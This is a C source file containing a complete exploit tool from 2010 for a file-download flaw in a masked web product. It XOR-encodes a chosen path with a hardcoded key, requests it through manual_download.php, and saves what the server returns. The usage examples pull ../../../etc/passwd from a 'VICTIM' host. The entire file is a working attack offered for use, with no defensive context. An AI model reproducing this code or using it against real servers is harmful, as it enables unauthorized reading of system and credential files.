#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <netdb.h>
#include <getopt.h>
#include <sys/socket.h>

#define BANNER	\
"  - A****** <= v4.2.0.9 (build 10067) File Download Vulnerability Exploit -\n"\
"                                                                    2010.10\n" \
"Author: 1ndr4, fr33b34r\n\n" \

void usage(const char *);
char *get_hostname(char *);
unsigned short get_port(char *);
char *get_uri(char *);
char *gen_encoded_fname_r(const char *);
int do_exploit(const char *, unsigned short, const char *, const char *);
int strip_header(int);

const char *key = "G*************5";

int main(int argc, char **argv)
{
	int c = 0;
	char *url = NULL, *fname = NULL;
	char *hostname = NULL, *uri = NULL;
	unsigned short port = 0;
	static struct option opts[] =
	{
		{"url", 1, 0, 'u' },
		{"file", 1, 0, 'f' },
		{"help", 0, 0, 'h' },
		{0, 0, 0, 0 }
	};

	fprintf(stdout, "%s", BANNER);

	while(1) {
		int idx = 0;
		c = getopt_long(argc, argv, "u:f:h", opts, &idx);
		if(c == -1) break;
		switch(c) {
		case 'u':
			url = optarg;
			break;
		case 'f':
			fname = optarg;
			break;
		case 'h':
		default:
			usage(argv[0]);
			break;
		}
	}

	if(argc == 1 || url == NULL || fname == NULL) {
		usage(argv[0]);
	}

	if((hostname = get_hostname(url)) == NULL) {
		fprintf(stderr, "[!] No such hostname information.\n");
		usage(argv[1]);
	}
	port = get_port(hostname);
	if((uri = get_uri(url)) == NULL) {
		fprintf(stderr, "[!] No such URI information.\n");
		usage(argv[1]);
	}
	fprintf(stdout, 
		"[*] Target: %s, Port: %d\n"
		"[*] URI: %s\n"
		"[*] Download File: %s\n"
		"[*] Key String: `%s' (%d bytes)\n",
	hostname, port, uri, fname, key, strlen(key));

	if(*hostname == '\0' || *uri == '\0')
		usage(argv[1]);

	if(do_exploit(hostname, port, uri, fname) != 0) {
		fprintf(stdout, "[!] Exploit failed.\n");
	} else {
		fprintf(stdout, "[*] Exploit executed successfully.\n");
	}

	exit(0);
	
}

void usage(const char *prog)
{
	fprintf(stdout, 
		"<OPTIONS>\n"
		"  -u,  --url\t<TARGET URL>\n"
		"  -f,  --file\t<FILENAME> (FullPath-Name)\n"
		"  -h,  --help\t[Show this message]\n\n"
		"<EXAMPLES>\n"
		" %s -u http://VICTIM/manual_download.php -f ../../../etc/passwd\n"
		" %s -u http://TARGET:8080/blah/manual_download.php -f ../../../etc/issue\n", prog, prog);
	exit(0);
}

char *get_hostname(char *path)
{
	static char ret[64];
	char *ptr = NULL, *str = NULL;
	
	str = path;

	if(memcmp(path, "http://", 7) == 0)
		str = (path + 7);
	while(*str == '/') str++;
	if((ptr = strchr(str, '/')) == NULL)
		ptr = str + strlen(str);
	snprintf(ret, (ptr - str) + 1, "%s", (char *)str);
	return ret;
}

unsigned short get_port(char *hostname)
{
	unsigned short port = 0;
	char *ptr = NULL;
	
	if((ptr = strchr(hostname, ':')) == NULL) {
		port = 80; // default HTTP port
	} else {
		port = atoi(ptr + 1);
		*ptr = '\0';
	}
	return port;
}

char *get_uri(char *path)
{
	char *ptr = NULL, *str = NULL, *ret = NULL;
	
	str = path;
	if(memcmp(path, "http://", 7) == 0)
		str = (path + 7);
	while(*str == '/') str++;
	if((ptr = strchr(str, '/')) == NULL) ret = NULL;
	else ret = ptr;
	return ret;
}

char *gen_encoded_fname_r(const char *fname)
{
	int idx = 0, i = 0, j = 0;
	unsigned char r = 0;
	char *ret = NULL;
	int mlen = ((strlen(fname) * 3) + 1);

	if((ret = malloc(mlen)) < 0)
		return NULL;
	memset(ret, 0x00, mlen);

	idx = strlen(fname);

	if(idx > strlen(key)) {
		while(1) {
			idx -= strlen(key);
			if(idx < strlen(key)) break;
		}
	}
	j = idx;
	for(i = 0; i < strlen(fname); i++,j++) {
		if(j == strlen(key)) j = 0;
		r = key[j] ^ fname[i];
		snprintf(ret + strlen(ret), mlen - strlen(ret), "%03d", r);
	}
	return ret;
}

int do_exploit(const char *host, unsigned short port, const char *uri, const char *file)
{
	int s = 0, fd = 0, http_data_len = 0, n = 0, ret = -1;
	char *new_filestr = NULL, *http_data = NULL, *ptr = NULL;
	char buf[1024], fname[256];
	struct sockaddr_in sin;
	struct hostent *he = NULL;
	
	if((new_filestr = gen_encoded_fname_r(file)) == NULL) {
		fprintf(stderr, "[!] Failed to filename encoding.\n");
		return -1;
	}
	fprintf(stdout, "[>] Encoded File String: %s\n", new_filestr);

	http_data_len = strlen(host) + strlen(uri) + strlen(new_filestr) + 1024;

	fprintf(stdout, "[>] Implementing HTTP data.....");
	if((http_data = malloc(http_data_len)) < 0)
		fprintf(stdout, "failed\n");
	else
		fprintf(stdout, "success\n");

	snprintf(http_data, http_data_len,
		"GET %s?fileName=%s HTTP/1.0\r\n"
		"Host: %s\r\n"
		"User-Agent: "
		"A****** <= v4.1.5.2 (build 8255) "
		"File Download Vulnerability PoC Code\r\n\r\n",
	uri,new_filestr,host);
	free(new_filestr);

	if((he = gethostbyname(host)) == NULL) {
		fprintf(stderr, "[!] gethostbyname() function error\n");
		goto failed;
	}
	if((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		fprintf(stderr, "[!] socket() function error.\n");
		goto failed;
	}

	memcpy(&sin.sin_addr, he->h_addr, he->h_length);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);

	if(connect(s, (struct sockaddr *)&sin, sizeof(sin)) != 0) {
		fprintf(stderr, "[!] connect() function error\n");
		goto failed;
	}
	
	if(send(s, http_data, strlen(http_data), 0) < 0) {
		fprintf(stderr, "[!] send() function error\n");
		goto failed;
	}
	
	fprintf(stdout, "[*] Exploiting..... ");
	if((n = strip_header(s)) == 200) {
		if((ptr = strrchr(file, '/')) == NULL) {
			snprintf(fname, sizeof(fname), "%s.%s", host, file);
		}
		ptr++;
		snprintf(fname, sizeof(fname), "%s.%s", host, ptr);
		fprintf(stdout, "OK\n");
	} else {
		snprintf(fname, sizeof(fname), "%s.error.txt", host);
		fprintf(stdout, "Failed (HTTP Code: %d)\n", n);
	}
	fprintf(stdout, "[>] Saving Result `%s'..... ", fname);	

	unlink(fname);
	if((fd = open(fname, O_RDWR|O_CREAT, 0600)) < 0) {
		fprintf(stdout, "Failed\n");
		fprintf(stderr, "[!] '%s' file open error\n", fname);
		goto failed;
	}
	while(1) {
		n = recv(s, buf, sizeof(buf), 0);
		if(write(fd, buf, n) != n) {
			fprintf(stdout, "Failed\n");
			fprintf(stderr, "[!] File write error\n");
			goto failed;
		}

		if(n == -1) {
			fprintf(stdout, "Failed\n");
			fprintf(stderr, "[!] recv() function error\n");
			goto failed;
		} else if(n == 0) {
			ret = 0;
			fprintf(stdout, "OK\n");
			break;
		} else {
			continue;
		}
	}
failed:
	if(s > 0)
		close(s);
	if(http_data != NULL)
		free(http_data);
	if(fd > 0)
		close(fd);

	return ret;
}

int strip_header(int s)
{
	const char *crlf = "\x0D\x0A\x0D\x0A";
	unsigned char acc = 0;
	int n = 0, len = 0, i = 0;
	char *ptr = NULL;
	char buf[1024];

	while(1) {
		memset(buf, 0x00, sizeof(buf));

		if((n = recv(s, buf, sizeof(buf) - 1, MSG_PEEK)) == 0)
			return -1;
		if((ptr = strstr(buf, crlf)) != NULL) {
			len = (ptr - buf) + 4;
			recv(s, buf, len, 0);
			goto filled;
		} else {
			for(i = 0; i < n; i++) {
				if(buf[i] == crlf[acc]) {
					acc++;
				} else {
					if(acc > 0) {
						acc = 0;
					}
				}
				if(acc > 3) {
					recv(s, buf, i, 0);
					goto filled;
				}
			}
			recv(s, buf, i, 0);
		}
	}
filled:
	return atoi(buf + 8);
}

